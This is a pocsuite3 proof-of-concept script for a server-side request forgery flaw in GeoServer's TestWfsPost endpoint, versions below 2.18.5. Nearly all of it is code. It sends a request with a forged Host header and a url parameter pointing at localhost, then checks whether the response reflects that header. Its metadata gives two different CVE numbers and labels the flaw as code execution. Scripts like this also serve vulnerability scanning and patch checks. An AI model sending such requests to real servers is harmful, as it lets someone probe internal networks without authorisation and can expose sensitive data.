from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CVE-2021-40882'  # ssvid
    version = '1.0'
    name = ' GeoServer TestWfsPost SSRF漏洞'
    appName = ' GeoServer'
    appVersion = '<2.18.5'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''GeoServer是一个功能齐全,遵循OGC开放标准的开源WFS-T和WMS服务器。CVE-2021-40822中，由于GeoServer对Host头验证不充分，导致攻击者可构造恶意请求绕过相关验证，发起SSRF，从而可扫描内网造成敏感数据泄漏。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {
                'Host': 'example.com',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = "form_hf_0=&url=http://localhost:8090/geoserver/&body=&username=&password="
            target = self.url+"/geoserver/TestWfsPost"
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200 and "example.com" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)